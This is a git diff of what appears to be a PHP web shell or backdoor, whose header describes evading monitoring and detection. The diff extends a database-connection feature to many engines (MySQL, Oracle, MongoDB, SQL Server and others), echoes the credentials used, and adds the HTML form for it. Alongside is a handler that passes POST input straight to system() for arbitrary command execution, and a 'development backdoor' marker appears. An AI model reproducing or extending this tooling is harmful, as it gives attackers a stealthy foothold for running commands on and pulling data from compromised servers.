@@ -12,7 +12,7 @@
  * monitoring system without rising any uncommon process tree nor disk operation.
  * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
  */
-error_reporting(0);
+//error_reporting(0);
 session_start();
 
 // Features name constants
@@ -232,7 +232,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
     ob_start();
     if ($type !== "textarea") {
         ?>
-        <div class="flex flex-col gap-y-2">
+        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                 <?php echo $label ?>
                 <?php
@@ -262,7 +262,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
     }
     else {
         ?>
-        <div class="flex flex-col gap-y-2">
+        <div class="flex flex-col gap-y-2" id="<?php echo $name ?>-container">
             <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                 <?php echo $label ?>
                 <?php
@@ -291,10 +291,21 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
     return ob_get_clean();
 }
 
+/**
+ * Create a select field
+ *
+ * @param $label string Label for the select
+ * @param $name string Name of the select
+ * @param $options array<{label: string, value: string, disabled?: bool, selected?: bool}> Options for the select
+ * @param $required bool Whether the select is required
+ * @param $disable_reason string|null Reason for the option to be disabled, if any
+ *
+ * @return string
+ */
 function makeSelect($label, $name, $options, $required = false, $disable_reason = null) {
     ob_start();
     ?>
-    <div>
+    <div id="<?php echo $name ?>-container">
         <label for="<?php echo $name ?>" class="block text-sm font-medium leading-6 text-gray-900">
             <?php echo $label ?>
             <?php
@@ -318,6 +329,7 @@ function makeSelect($label, $name, $options, $required = false, $disable_reason 
                      $option["value"] .
                      "' " .
                      ($option["disabled"] ? "disabled" : "") .
+                     ($option["selected"] ? "selected" : "") .
                      ">" .
                      $option["label"] .
                      ($option["disabled"] && !is_null($disable_reason) ? " - $disable_reason" : "") .
@@ -345,7 +357,7 @@ function makeSelect($label, $name, $options, $required = false, $disable_reason 
 function makeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
     ob_start();
     ?>
-    <div class="relative flex items-start">
+    <div class="relative flex items-start" id="<?php echo $name ?>-container">
         <div class="flex h-6 items-center">
             <input id="<?php echo $name ?>" name="<?php echo $name ?>" type="checkbox"
                    class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
@@ -1159,75 +1171,552 @@ function listEnabledExtensions() {
 }
 
 /**
- * Connect to a database using the given credentials
+ * Connect to a database using the given credentials and return the connection
  *
  * @param $db_type string Database type
- * @param $username string Username
- * @param $password string Password
- * @param $host string Host
- * @param $port int Port
+ * @param $username string Username to connect with
+ * @param $password string Password to connect with
+ * @param $host string Host to connect to
+ * @param $port int Port to connect to
+ * @param $service_name string Service name to use for connection
+ * @param $sid string SID to use for connection
+ * @param $database string Database to connect to
+ * @param $charset string Charset to use for connection
+ * @param $options string Options to use for connection
+ * @param $role string Role to use for connection
+ * @param $dialect string Dialect to use for connection
+ * @param $odbc_driver string ODBC driver to use for connection
+ * @param $server string Informix server name
+ * @param $protocol string Protocol to use for connection
+ * @param $enableScrollableCursors string Whether to enable scrollable cursors
+ * @param $raw_connection_string string Raw connection string to use for connection
  *
- * @return PDO|null
+ * @return resource|mysqli|PDO|MongoDB\Driver\Manager|Mongo|null
  */
-function connectToDatabase($db_type, $username, $password, $host = 'localhost', $port = null) {
+function connectToDatabase(
+    $db_type,
+    $username,
+    $password,
+    $host = 'localhost',
+    $port = null,
+    $service_name = null,
+    $sid = null,
+    $database = null,
+    $charset = null,
+    $options = null,
+    $role = null,
+    $dialect = null,
+    $odbc_driver = null,
+    $server = null,
+    $protocol = "onsoctcp",
+    $enableScrollableCursors = null,
+    $raw_connection_string = ""
+) {
     if ($db_type === 'mysql') {
-        $port = $port ?: 3306; // Default MySQL port
-        $dsn  = "mysql:host=$host;port=$port";
+        $port = $port ?: 3306;
+
+        // Check if the MySQL extension is loaded
+        if (extension_loaded("mysql")) {
+            $connection = mysql_connect("$host:$port", $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: mysql] Connection failed: " . mysql_error();
+            }
+            else {
+                echo "[Driver: mysql] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        // Check if the MySQLi extension is loaded
+        elseif (extension_loaded("mysqli")) {
+            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
+            try {
+                $connection = mysqli_connect($host, $username, $password, $database, $port);
+
+                if (!$connection) {
+                    echo "[Driver: mysqli] Connection failed: " . mysqli_connect_error();
+                }
+                else {
+                    echo "[Driver: mysqli] Connected successfully using $username:$password.";
+                }
+
+                return $connection ?: null;
+            }
+            catch (mysqli_sql_exception $e) {
+                echo "[Driver: mysqli] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the PDO MySQL extension is loaded
+        elseif (extension_loaded("pdo_mysql")) {
+            try {
+                $dsn = "mysql:host=$host;port=$port" .
+                       (!empty($database) ? ";dbname=$database" : "") .
+                       (!empty($charset) ? ";charset=$charset" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_mysql] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_mysql] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
+        elseif (extension_loaded("pdo")) {
+            echo "PDO extension is loaded but PDO MySQL driver is not installed.";
+            return null;
+        }
+        else {
+            echo "MySQL extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'cubrid') {
-        $port = $port ?: 33000; // Default CUBRID port
-        $dsn  = "cubrid:host=$host;port=$port";
+        $port = $port ?: 30000;
+
+        // Check if the CUBRID PDO extension is loaded
+        if (extension_loaded("pdo_cubrid")) {
+            try {
+                $dsn = "cubrid:host=$host;port=$port" .
+                       (!empty($database) ? ";dbname=$database" : "") .
+                       (!empty($charset) ? ";charset=$charset" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_cubrid] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the CUBRID extension is loaded
+        elseif (extension_loaded("cubrid")) {
+            $connection = cubrid_connect($host, $port, $database, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: cubrid] Connection failed: " . cubrid_error_msg();
+            }
+            else {
+                echo "[Driver: cubrid] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "CUBRID extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'pgsql') {
-        $port = $port ?: 5432; // Default PostgreSQL port
-        $dsn  = "pgsql:host=$host;port=$port";
+        $port = $port ?: 5432;
+
+        // Check if the PostgreSQL PDO extension is loaded
+        if (extension_loaded("pdo_pgsql")) {
+            try {
+                $dsn = "pgsql:host=$host;port=$port" . (!empty($database) ? ";dbname=$database" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_pgsql] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_pgsql] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the PostgreSQL extension is loaded
+        elseif (extension_loaded("pgsql")) {
+            $connection = pg_connect("host=$host port=$port dbname=$database user=$username password=$password");
+
+            if (!$connection) {
+                echo "[Driver: pgsql] Connection failed: " . pg_last_error();
+            }
+            else {
+                echo "[Driver: pgsql] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "PostgreSQL extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'sqlite') {
-        $dsn = "sqlite:$host";
+        // Check if the SQLite PDO extension is loaded
+        if (extension_loaded("pdo_sqlite")) {
+            try {
+                $dsn = "sqlite:$host";
+
+                $pdo = new PDO($dsn);
+                echo "[Driver: pdo_sqlite] Connected successfully using $host.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_sqlite] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the SQLite extension is loaded
+        elseif (extension_loaded("sqlite3")) {
+            $connection = sqlite_open($host, 0666, $error);
+
+            if (!$connection) {
+                echo "[Driver: sqlite3] Connection failed: $error";
+            }
+            else {
+                echo "[Driver: sqlite3] Connected successfully using $host.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "SQLite extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'sqlsrv') {
-        $port = $port ?: 1433; // Default SQL Server port
-        $dsn  = "sqlsrv:Server=$host,$port";
+        $port = $port ?: 1433;
+
+        // Check if the SQL Server PDO extension is loaded
+        if (extension_loaded("pdo_sqlsrv")) {
+            try {
+                $dsn = "sqlsrv:Server=$host,$port" . (!empty($database) ? ";Database=$database" : "");
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_sqlsrv] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_sqlsrv] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the SQL Server extension is loaded
+        elseif (extension_loaded("sqlsrv")) {
+            echo "Connecting to $host with default instance specification ...\n";
+            $connection = sqlsrv_connect($host, array("Database" => $database, "UID" => $username, "PWD" => $password));
+
+            if (!$connection) {
+                echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
+                echo "Trying to connect to $host,$port ...";
+
+                $connection = sqlsrv_connect(
+                    "$host,$port",
+                    array("Database" => $database, "UID" => $username, "PWD" => $password)
+                );
+
+                if (!$connection) {
+                    echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
+                }
+                else {
+                    echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).";
+                }
+            }
+            else {
+                echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "SQL Server extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'oci') {
-        $dsn = "oci:dbname=//$host";
+        $port = $port ?: 1521;
+
+        // Check if the Oracle PDO extension is loaded
+        if (extension_loaded("pdo_oci")) {
+            try {
+                if (!empty($sid)) {
+                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SID = $sid)))";
+                }
+                else {
+                    $tns = "(DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = $host)(PORT = $port))(CONNECT_DATA = (SERVICE_NAME = $service_name)))";
+                }
+                $dsn = "oci:dbname=$tns";
+
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_oci] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_oci] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the Oracle extension is loaded
+        elseif (extension_loaded("oci8")) {
+            $connection = oci_connect($username, $password, "$host:$port/$service_name");
+
+            if (!$connection) {
+                echo "[Driver: oci8] Connection failed: " . oci_error();
+            }
+            else {
+                echo "[Driver: oci8] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "Oracle extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'mongodb') {
-        $port = $port ?: 27017; // Default MongoDB port
-        $dsn  = "mongodb://$host:$port";
+        $port = $port ?: 27017;
+        $dsn  = "mongodb://$username:$password@$host:$port/$database";
+
+        // Check if the MongoDB extension is loaded
+        if (extension_loaded("mongodb")) {
+            try {
+                $connection = new MongoDB\Driver\Manager($dsn, explode("&", $options));
+                echo "[Driver: mongodb] Connected successfully using $username:$password.";
+                return $connection;
+            }
+            catch (MongoDB\Driver\Exception\Exception $e) {
+                echo "[Driver: mongodb] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the Mongo extension is loaded
+        elseif (extension_loaded("mongo")) {
+            try {
+                $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
+                echo "[Driver: mongo] Connected successfully using $username:$password.";
+                return $connection;
+            }
+            catch (MongoConnectionException $e) {
+                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
+            }
+        }
+        else {
+            echo "MongoDB extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'ibm') {
-        $port = $port ?: 50000; // Default IBM DB2 port
-        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$host;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;";
+        $port = $port ?: 50000;
+        $dsn  = "ibm:DRIVER={IBM DB2 ODBC DRIVER};DATABASE=$database;HOSTNAME=$host;PORT=$port;PROTOCOL=TCPIP;UID=$username;PWD=$password;";
+
+        // Check if the IBM PDO extension is loaded
+        if (extension_loaded("pdo_ibm")) {
+            try {
+                $pdo = new PDO($dsn);
+                echo "[Driver: pdo_ibm] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_ibm] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the IBM extension is loaded
+        elseif (extension_loaded("ibm")) {
+            $connection = db2_connect($dsn, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: ibm] Connection failed: " . db2_conn_error();
+            }
+            else {
+                echo "[Driver: ibm] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "IBM extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'firebird') {
-        $port = $port ?: 3050; // Default Firebird/Interbase port
-        $dsn  = "firebird:host=$host;dbname=$host/port:$port";
+        $port = $port ?: 3050;
+        $dsn  = "firebird:dbname=$host/$port:$database" .
+                (!empty($charset) ? ";charset=$charset" : "") .
+                (!empty($role) ? ";role=$role" : "") .
+                (!empty($dialect) ? ";dialect=$dialect" : "");
+
+        // Check if the Firebird PDO extension is loaded
+        if (extension_loaded("pdo_firebird")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_firebird] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_firebird] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the Firebird extension is loaded
+        elseif (extension_loaded("interbase")) {
+            echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...";
+            $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
+                echo "Trying to connect to $host:$database (TCP/IP implicit port) ...";
+
+                $connection = ibase_connect($host . ":" . $database, $username, $password);
+
+                if (!$connection) {
+                    echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
+                    echo "Trying to connect to //$host/$database (NetBEUI) ...";
+
+                    $connection = ibase_connect("//" . $host . "/" . $database, $username, $password);
+
+                    if (!$connection) {
+                        echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
+                    }
+                    else {
+                        echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).";
+                    }
+                }
+                else {
+                    echo "[Driver: interbase] Connected successfully using $username:$password (host:database).";
+                }
+            }
+            else {
+                echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "Firebird extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'odbc') {
-        $dsn = "odbc:Driver={Microsoft Access Driver (*.mdb)};Dbq=$host";
+        $dsn = "odbc:Driver=$odbc_driver;Server=$host,$port;Database=$database;Uid=$username;Pwd=$password;";
+
+        // Check if the ODBC PDO extension is loaded
+        if (extension_loaded("pdo_odbc")) {
+            try {
+                $pdo = new PDO($dsn);
+                echo "[Driver: pdo_odbc] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_odbc] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the ODBC extension is loaded
+        elseif (extension_loaded("odbc")) {
+            $connection = odbc_connect($dsn, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: odbc] Connection failed: " . odbc_errormsg();
+            }
+            else {
+                echo "[Driver: odbc] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "ODBC extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'informix') {
-        $dsn = "informix:host=$host;service=$port";
+        $port = $port ?: 9800;
+        $dsn  = "informix:host=$host;service=$port;database=$database;server=$server;protocol=$protocol;EnableScrollableCursors=$enableScrollableCursors";
+
+        // Check if the Informix PDO extension is loaded
+        if (extension_loaded("pdo_informix")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_informix] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_informix] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        else {
+            echo "Informix extension is not loaded.";
+            return null;
+        }
     }
     elseif ($db_type === 'sybase') {
-        $port = $port ?: 5000; // Default Sybase port
-        $dsn  = "sybase:host=$host;port=$port";
+        $port = $port ?: 5000;
+        $dsn  = "sybase:host=$host:$port" . (!empty($database) ? ";dbname=$database" : "");
+
+        // Check if the Sybase PDO extension is loaded
+        if (extension_loaded("pdo_dblib")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "[Driver: pdo_dblib] Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        // Check if the Sybase extension is loaded
+        elseif (extension_loaded("sybase")) {
+            $connection = sybase_connect($host, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: sybase] Connection failed: " . sybase_get_last_message();
+            }
+            else {
+                echo "[Driver: sybase] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        // Check if the FreeTDS extension is loaded
+        elseif (extension_loaded("mssql")) {
+            $connection = mssql_connect($host, $username, $password);
+
+            if (!$connection) {
+                echo "[Driver: mssql] Connection failed: " . mssql_get_last_message();
+            }
+            else {
+                echo "[Driver: mssql] Connected successfully using $username:$password.";
+            }
+
+            return $connection ?: null;
+        }
+        else {
+            echo "Sybase extension is not loaded.";
+            return null;
+        }
     }
-    else {
-        echo "Unsupported database type: $db_type";
-        return null;
+    elseif ($db_type === 'raw') {
+        $dsn = $raw_connection_string;
+
+        // Check if the PDO extension is loaded
+        if (extension_loaded("pdo")) {
+            try {
+                $pdo = new PDO($dsn, $username, $password);
+                echo "Connected successfully using $username:$password.";
+                return $pdo;
+            }
+            catch (PDOException $e) {
+                echo "Connection failed: " . $e->getMessage();
+                return null;
+            }
+        }
+        else {
+            echo "PDO extension is not loaded.";
+            return null;
+        }
     }
 
-    try {
-        $pdo = new PDO($dsn, $username, $password);
-        echo "Connected to $db_type as $username.";
-        return $pdo;
-    }
-    catch (PDOException $e) {
-        echo "Connection failed: " . $e->getMessage();
-        return null;
-    }
+    echo "Unsupported database type: $db_type";
+    return null;
 }
 
 // TEMPLATE DEVELOPMENT BACKDOOR - START
@@ -1500,8 +1989,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                         "label"    => "MySQL",
                                         "disabled" => !extension_loaded("mysql") &&
                                                       !extension_loaded("mysqli") &&
-                                                      !extension_loaded("pdo_mysql") &&
-                                                      !extension_loaded("mysqlnd"),
+                                                      !extension_loaded("pdo_mysql"),
                                     ],
                                     [
                                         "value"    => "cubrid",
@@ -1531,7 +2019,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                     [
                                         "value"    => "mongodb",
                                         "label"    => "MongoDB",
-                                        "disabled" => !extension_loaded("mongodb") && !extension_loaded("mongodb"),
+                                        "disabled" => !extension_loaded("mongo") && !extension_loaded("mongodb"),
                                     ],
                                     [
                                         "value"    => "ibm",
@@ -1552,20 +2040,20 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                     [
                                         "value"    => "informix",
                                         "label"    => "Informix",
-                                        "disabled" => !extension_loaded("informix") &&
-                                                      !extension_loaded("pdo_informix"),
+                                        "disabled" => !extension_loaded("pdo_informix"),
                                     ],
                                     [
                                         "value"    => "sybase",
                                         "label"    => "Sybase",
                                         "disabled" => !extension_loaded("sybase") &&
-                                                      !extension_loaded("sybase_ct") &&
+                                                      !extension_loaded("mssql") &&
                                                       !extension_loaded("pdo_dblib"),
                                     ],
                                     [
                                         "value"    => "raw",
-                                        "label"    => "Raw connection",
+                                        "label"    => "Raw PDO connection string",
                                         "disabled" => !extension_loaded("pdo"),
+                                        "selected" => true,
                                     ],
                                 ),
                                 true,
@@ -1573,22 +2061,195 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                             ),
                             makeInput(
                                 "text",
-                                "Path",
-                                "__PARAM_1__",
-                                "C://path/to/directory or \\\\network\\path\\to\\directory",
-                                "Fully qualified path to the directory to list.",
+                                "Host",
+                                "__PARAM_2__",
+                                "localhost",
+                                "The host to connect to (default: localhost)"
+                            ),
+                            makeInput(
+                                "number",
+                                "Port",
+                                "__PARAM_3__",
+                                "3306",
+                                "
+                                    The port to connect to, default depend on the database
+                                    <ul class='text-sm text-zinc-500 list-disc list-inside'>
+                                        <li>MySQL (default: 3306)</li>
+                                        <li>CUBRID (default: 30000)</li>
+                                        <li>PostgreSQL (default: 5432)</li>
+                                        <li>SQLite (default: None)</li>
+                                        <li>SQL Server (default: 1433)</li>
+                                        <li>Oracle (default: 1521)</li>
+                                        <li>MongoDB (default: 27017)</li>
+                                        <li>IBM DB2 (default: 50000)</li>
+                                        <li>Firebird/Interbase (default: 3050)</li>
+                                        <li>ODBC (default: None)</li>
+                                        <li>Informix (default: 9800)</li>
+                                        <li>Sybase (default: 5000)</li>
+                                    </ul>"
+                            ),
+                            makeInput(
+                                "text",
+                                "Username",
+                                "__PARAM_4__",
+                                "admin",
+                                "The username to connect with.",
+                                true
+                            ),
+                            makeInput(
+                                "password",
+                                "Password",
+                                "__PARAM_5__",
+                                "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                                "The password to connect with.",
                                 true
                             ),
                             makeInput(
                                 "text",
-                                "Depth",
-                                "__PARAM_2__",
-                                "5",
-                                "How many levels deep to list, where " . makeCodeHighlight(0) .
-                                " is the current directory and " . makeCodeHighlight("inf") .
-                                " means to list all.",
-                                true
+                                "Database",
+                                "__PARAM_6__",
+                                "ExampleDB",
+                                "The database to connect to."
                             ),
+                            makeInput(
+                                "text",
+                                "Charset",
+                                "__PARAM_7__",
+                                "utf8",
+                                "The charset to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Service name",
+                                "__PARAM_8__",
+                                "orcl",
+                                "The service name to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "SID",
+                                "__PARAM_9__",
+                                "orcl",
+                                "The SID to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Options",
+                                "__PARAM_10__",
+                                "ssl=true",
+                                "The options to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Role",
+                                "__PARAM_11__",
+                                "SYSDBA",
+                                "The role to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Dialect",
+                                "__PARAM_12__",
+                                "3",
+                                "The dialect to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Protocol",
+                                "__PARAM_13__",
+                                "onsoctcp",
+                                "The protocol to use for the connection."
+                            ),
+                            makeCheckbox(
+                                "__PARAM_14__",
+                                "Enable scrollable cursors",
+                                "Enable scrollable cursors for the connection.",
+                                true,
+                                "1"
+                            ),
+                            makeInput(
+                                "text",
+                                "ODBC driver",
+                                "__PARAM_15__",
+                                "ODBC Driver 17 for SQL Server",
+                                "The ODBC driver to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Raw connection string",
+                                "__PARAM_16__",
+                                "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
+                                "The raw connection string to use for the connection."
+                            ),
+                            makeInput(
+                                "text",
+                                "Server",
+                                "__PARAM_17__",
+                                "ol_informix1170",
+                                "The Informix server name to use for the connection."
+                            ),
+                            '<script>
+                                function hideAll() {
+                                    for (let i = 2; i <= 17; i++) {
+                                        document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
+                                    }
+                                }
+                                
+                                function showRange(start, end) {
+                                    for (let i = start; i <= end; i++) {
+                                        document.getElementById(`__PARAM_${i}__-container`).classList.remove(`hidden`);
+                                    }
+                                }
+                                
+                                hideAll();
+                                showRange(16, 16);
+                                const select = document.getElementById(`__PARAM_1__`);
+                                select.addEventListener(`change`, (event) => {
+                                   const value = event.target.value;
+                                   hideAll()
+                                    
+                                   switch (value) {
+                                        case `raw`:
+                                            showRange(16, 16);
+                                            break;
+                                        case `mysql`:
+                                        case `cubrid`:
+                                            showRange(2, 7);
+                                            break;
+                                        case `pgsql`:
+                                        case `sqlsrv`:
+                                        case `ibm`:
+                                        case `sybase`:
+                                            showRange(2, 6);
+                                            break;
+                                        case `sqlite`:
+                                            showRange(2, 2);
+                                            showRange(4, 5);
+                                            break;
+                                        case `oci`:
+                                            showRange(2, 5);
+                                            showRange(8, 9);
+                                            break;
+                                        case `mongodb`:
+                                            showRange(2, 6);
+                                            showRange(10, 10);
+                                            break;
+                                        case `firebird`:
+                                            showRange(2, 7);
+                                            showRange(11, 12);
+                                            break;
+                                        case `odbc`:
+                                            showRange(2, 6);
+                                            showRange(15, 15);
+                                            break;
+                                        case `informix`:
+                                            showRange(2, 6);
+                                            showRange(13, 14);
+                                            showRange(17, 17);
+                                            break;
+                                   }
+                                });
+                            </script>',
                         )
                     ),
                 ),
@@ -1629,6 +2290,36 @@ if (isPost()) {
             break;
         case $RUN_COMMAND:
             system($_POST["__PARAM_1__"]);
+            break;
+        case $QUERY_DATABASES:
+            $connection = connectToDatabase(
+                $_POST["__PARAM_1__"],
+                $_POST["__PARAM_4__"],
+                $_POST["__PARAM_5__"],
+                $_POST["__PARAM_2__"],
+                $_POST["__PARAM_3__"],
+                $_POST["__PARAM_8__"],
+                $_POST["__PARAM_9__"],
+                $_POST["__PARAM_6__"],
+                $_POST["__PARAM_7__"],
+                $_POST["__PARAM_10__"],
+                $_POST["__PARAM_11__"],
+                $_POST["__PARAM_12__"],
+                $_POST["__PARAM_15__"],
+                $_POST["__PARAM_17__"],
+                $_POST["__PARAM_13__"],
+                $_POST["__PARAM_14__"],
+                $_POST["__PARAM_16__"]
+            );
+
+            /*if ($pdo) {
+                $stmt      = $pdo->query("SHOW DATABASES");
+                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
+                echo "Databases:\n";
+                foreach ($databases as $database) {
+                    echo "- $database\n";
+                }
+            }*/
             break;
         default:
             echo "Unrecognized operation '$operation'";
